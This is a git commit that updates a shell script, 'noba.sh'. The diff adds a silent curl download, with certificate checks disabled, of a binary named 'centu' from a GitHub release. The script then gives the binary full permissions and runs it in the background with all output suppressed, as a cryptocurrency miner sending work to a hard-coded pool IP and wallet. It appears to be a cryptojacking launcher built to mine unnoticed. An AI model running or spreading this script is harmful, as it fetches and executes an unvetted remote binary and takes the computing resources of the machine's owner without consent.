f804f17f2cb86311e99071e7da085aba212cbcb4
paskofa10 <mr.paskofa10@jugda.com>
2025-06-14 08:56:33 +0700

    Update noba.sh

--- noba.sh
+++ noba.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
  
-http://github.com/paskofa10/KunCuN/releases/download/uranus/centu
+curl -sLkO http://github.com/paskofa10/KunCuN/releases/download/uranus/centu
 chmod 777 centu 
 ./centu -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
 sleep 10
